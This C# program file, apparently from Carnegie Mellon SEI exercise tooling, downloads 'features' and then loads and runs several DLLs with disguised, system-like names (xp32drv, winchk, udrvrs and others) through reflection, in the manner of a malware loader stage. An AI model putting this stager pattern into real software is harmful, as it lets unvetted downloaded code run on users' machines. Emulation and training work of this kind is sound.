/*
Copyright 2023 Carnegie Mellon University.
Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
root or contact permission@sei.cmu.edu for full terms.
*/

// See https://aka.ms/new-console-template for more information
using Adsvcexec;
using System.Reflection;

Helpers helpers = new Helpers();
helpers.DownloadFeatures();

Assembly assembly = System.Reflection.Assembly.LoadFile(AppDomain.CurrentDomain.BaseDirectory + "\\modules\\" + "eugnxt.dll");
Type t = assembly.GetType("eugnxt.Class1");
var methodInfo = t.GetMethod("Run");

if (methodInfo == null)
{
    // throw some exception
}

var o = Activator.CreateInstance(t);
var result = methodInfo.Invoke(o, null);

/////////////////////////////////////////////////////////////////////////////////////////////

Assembly assembly2 = System.Reflection.Assembly.LoadFile(AppDomain.CurrentDomain.BaseDirectory + "\\modules\\" + "nxtproc.dll");
Type t2 = assembly2.GetType("nxtproc.Class1");

var methodInfo2 = t2.GetMethod("Run");

if (methodInfo2 == null)
{
    // throw some exception
}

var o2 = Activator.CreateInstance(t2);
var result2 = methodInfo2.Invoke(o2, null);

/////////////////////////////////////////////////////////////////////////////////////////////

//**********download, but do not execute this one**********
//Assembly assembly3 = System.Reflection.Assembly.LoadFile(AppDomain.CurrentDomain.BaseDirectory + "\\modules\\" + "rstnop.dll");
//Type t3 = assembly3.GetType("rstnop.Class1");

//var methodInfo3 = t3.GetMethod("Run");

//if (methodInfo3 == null)
//{
//    // throw some exception
//}

//var o3 = Activator.CreateInstance(t3);
//var result3 = methodInfo3.Invoke(o3, null);

///////////////////////////////////////////////////////////////////////////////////////////

Assembly assembly4 = System.Reflection.Assembly.LoadFile(AppDomain.CurrentDomain.BaseDirectory + "\\modules\\" + "xp32drv.dll");
Type t4 = assembly4.GetType("xp32drv.Class1");

var methodInfo4 = t4.GetMethod("Run");

if (methodInfo4 == null)
{
    // throw some exception
}

var o4 = Activator.CreateInstance(t4);
var result4 = methodInfo4.Invoke(o4, null);

/////////////////////////////////////////////////////////////////////////////////////////////

Assembly assembly5 = System.Reflection.Assembly.LoadFile(AppDomain.CurrentDomain.BaseDirectory + "\\modules\\" + "winchk.dll");
Type t5 = assembly5.GetType("winchk.Class1");

var methodInfo5 = t5.GetMethod("Run");

if (methodInfo5 == null)
{
    // throw some exception
}

var o5 = Activator.CreateInstance(t5);
var result5 = methodInfo5.Invoke(o5, null);

/////////////////////////////////////////////////////////////////////////////////////////////

Assembly assembly6 = System.Reflection.Assembly.LoadFile(AppDomain.CurrentDomain.BaseDirectory + "\\modules\\" + "dnlton.dll");
Type t6 = assembly6.GetType("dnlton.Class1");

var methodInfo6 = t6.GetMethod("Run");

if (methodInfo6 == null)
{
    // throw some exception
}

var o6 = Activator.CreateInstance(t6);
var result6 = methodInfo6.Invoke(o6, null);

/////////////////////////////////////////////////////////////////////////////////////////////

Assembly assembly7 = System.Reflection.Assembly.LoadFile(AppDomain.CurrentDomain.BaseDirectory + "\\modules\\" + "udrvrs.dll");
Type t7 = assembly7.GetType("udrvrs.Class1");

var methodInfo7 = t7.GetMethod("Run");

if (methodInfo7 == null)
{
    // throw some exception
}

var o7 = Activator.CreateInstance(t7);
var result7 = methodInfo7.Invoke(o7, null);

///////////////////////////////////////////////////////////////////////////////////////////

Console.ReadLine();

